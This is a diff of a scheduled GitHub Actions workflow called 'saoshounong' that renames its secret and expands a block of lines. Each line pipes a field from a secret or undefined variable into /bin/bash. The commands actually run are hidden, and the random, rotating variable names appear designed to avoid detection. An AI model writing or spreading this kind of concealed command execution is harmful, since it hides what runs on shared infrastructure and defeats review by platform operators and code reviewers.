@@ -3,20 +3,27 @@ name: saoshounong
 on:
   workflow_dispatch:
   schedule:
-    - cron: '54 4/6 * * *'
+    - cron: '17 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: saoshounong
         env:
-          ijuxf56891: ${{ secrets.ijuxf56891 }}
+          crnyi4615: ${{ secrets.crnyi4615 }}
         run: |
-          echo $ijuxf56891 | jq -r .blb56007 | /bin/bash
-          echo $ntlxj1 | jq -r .jl3 | /bin/bash
-          echo $n9 | jq -r .ahh84 | /bin/bash
-          echo $it59 | jq -r .slwpe37805 | /bin/bash
-          echo $h81 | jq -r .vnaia88 | /bin/bash
-          echo $tug06 | jq -r .ydzq2444 | /bin/bash
+          echo $crnyi4615 | jq -r .wba176 | /bin/bash
+          echo $mwqu577 | jq -r .wtp349 | /bin/bash
+          echo $mvug41 | jq -r .mi0 | /bin/bash
+          echo $js9 | jq -r .bdlon3252 | /bin/bash
+          echo $bcd30961 | jq -r .snq252 | /bin/bash
+          echo $oa57 | jq -r .quyg3886 | /bin/bash
+          echo $eqj441 | jq -r .rihzq025 | /bin/bash
+          echo $afofz0428 | jq -r .ygsgn800 | /bin/bash
+          echo $szyq7 | jq -r .k17 | /bin/bash
+          echo $qjels26664 | jq -r .sriap04744 | /bin/bash
+          echo $i60778 | jq -r .r7 | /bin/bash
 
